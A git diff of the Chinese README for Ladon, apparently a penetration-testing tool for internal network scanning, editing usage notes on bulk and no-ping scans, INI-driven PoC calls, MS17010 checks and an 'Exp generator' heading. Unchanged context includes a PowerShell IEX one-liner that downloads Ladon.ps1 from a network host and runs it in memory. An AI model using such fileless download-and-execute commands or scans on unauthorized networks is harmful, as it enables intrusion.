@@ -224,11 +224,11 @@ ID | 功能 | 实现语言 | 功能说明
 
 ### 批量扫描
 0x001 参数 ip/24 ip/16 ip/8<br>
-```bash
-Ladon 192.168.1.8/24 OnlinePC 或 Ladon 192.168.1.8/16 OnlinePC
-```
+命令: Ladon 192.168.1.8/24 OnlinePC<br>
+
 0x002 文件 ip.txt ip24.txt ip16.txt url.txt host.txt domain.txt str.txt<br>
 程序根目录下创建对应文件即可,如批量扫描多个ip使用ip.txt,批量扫多个C段使用ip24.txt<br>
+无需指定txt程序会自动加载文件进行扫描,如扫描存活主机只需命令: Ladon OnlinePC<br>
 
 ### 禁ping扫描
 默认扫描会先通过icmp扫描主机是否存活，当使用工具转发内网<br>
@@ -238,6 +238,13 @@ Ladon noping 192.168.1.8/24<br>
 Ladon noping 192.168.1.8/24 MS17010<br>
 
 ### 配置INI调用任意程序或命令脚本
+适用场景，需调用相关命令或第三方工具进行批量操作<br>
+或者有新的POC，但来不及或无法写成DLL来调用时<br>
+很多第3方工具不支持批量或者说根本不支持批量网段<br>
+而Ladon不只限于批量IP、URL、IP段、任意内容等<br>
+是紧急情况下最适合用于验证内网是否存在漏洞工具<br>
+新的漏洞来时你能调好POC就不错了，批量更要时间<br>
+
 1  调用系统ping命令进行存活主机探测
 ping.ini<br>
 [Ladon]<br>
@@ -338,5 +345,9 @@ PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模
 > powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"
 ```
 <img src=https://k8gege.github.io/k8img/Ladon/ps/CmdPSRemoteLadon.gif></img>
+
+### 高级用法
+#### 0x001 Exp生成器
+
 
 #### [Top](#readme)
